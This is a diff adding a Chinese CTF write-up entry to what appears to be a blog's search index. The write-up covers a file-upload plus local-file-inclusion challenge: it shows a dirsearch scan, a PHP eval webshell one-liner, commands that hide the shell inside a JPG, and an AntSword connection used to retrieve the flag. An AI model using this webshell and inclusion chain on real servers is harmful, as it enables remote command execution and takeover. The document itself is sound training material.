@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>CTF-SWPUCTF2025秋季新生赛4</title>
+      <link href="/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/"/>
+      <url>/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/</url>
+      
+        <content type="html"><![CDATA[<p><em>题目来源：NSSCTF</em></p><p><em>练习时间：2026年2月3日</em></p><p><em>练习数量：1</em></p><p>上篇：<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a></p><p>📖 <strong>SWPUCTF 2025 秋季新生赛合集</strong>：<br>1️⃣<a href="https://sereniusx.github.io/2026/01/31/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B1/">CTF-SWPUCTF2025秋季新生赛1</a><br>2️⃣<a href="https://sereniusx.github.io/2026/02/01/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B2/">CTF-SWPUCTF2025秋季新生赛2</a><br>3️⃣<a href="https://sereniusx.github.io/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/">CTF-SWPUCTF2025秋季新生赛3</a><br>4️⃣<a href="https://sereniusx.github.io/2026/02/03/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B4/">CTF-SWPUCTF2025秋季新生赛4</a></p><hr><h2 id="⭐️-13-SWPUCTF-2025-秋季新生赛-ezez-include"><a href="#⭐️-13-SWPUCTF-2025-秋季新生赛-ezez-include" class="headerlink" title="⭐️ 13 [SWPUCTF 2025 秋季新生赛]ezez_include"></a>⭐️ 13 [SWPUCTF 2025 秋季新生赛]ezez_include</h2><p>🚩flag：<code>NSSCTF{0bcf4985-3ef7-4664-9e7a-b864ee217ce2}</code></p><p>💡hint：<code>WEB</code> <code>文件上传</code> <code>文件包含</code> <code>目录扫描</code></p><p>🔧tool：<code>antsword</code> <code>dirsearch</code></p><blockquote><p>文件包含漏洞LFI：应用程序在未对用户可控输入进行严格校验的情况下，将其用于文件包含操作，导致攻击者能够读取或执行服务器上的本地文件的安全漏洞。</p></blockquote><p>目录扫描工具dirsearch的下载：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p>基本使用方法（示例）：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://node1.anna.nssctf.cn:20739</span><br></pre></td></tr></tbody></table></figure><p>扫描结果：<br><img src="https://a1.boltp.com/2026/02/03/6982117d58202.png" alt="目录扫描结果"><br>访问/upload.php/<br><img src="https://a1.boltp.com/2026/02/03/698211c4a44c8.png" alt="访问结果"></p><p>制作一句话图片马方法：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>然后找到一张图片<code>tp.jpg</code>：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">copy tp.jpg/b+muma.php shell.jpg</span><br></pre></td></tr></tbody></table></figure><p>在linux系统中的命令是：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> tp.jpg muma.php &gt; shell.jpg</span><br></pre></td></tr></tbody></table></figure><p>制作出的shell图片：<br><img src="https://a1.boltp.com/2026/02/03/69821737b3d45.jpg" alt="制作出的shell图片"><br>上传成功：<br><img src="https://a1.boltp.com/2026/02/03/698217294cfb1.png" alt="shell.jpg上传成功"><br>后续其实用的是muma.jpg（直接改了后缀）<br><img src="https://a1.boltp.com/2026/02/03/69821909d4bb9.png"><br>在index.php界面读取upload/{你上传的文件}.jpg<br>发现确实以php格式运行<br>访问完成后，可以用蚁剑。<br>具体配置如下：<br><img src="https://a1.boltp.com/2026/02/03/698219b0d4e70.png"><br><img src="https://a1.boltp.com/2026/02/03/698219e0f0a93.png"><br>最后在根目录找到了flag：<br><img src="https://a1.boltp.com/2026/02/03/69821a6bf325d.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CTF-SWPUCTF2025秋季新生赛3</title>
       <link href="/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/"/>
       <url>/2026/02/02/CTF-SWPUCTF2025%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B3/</url>
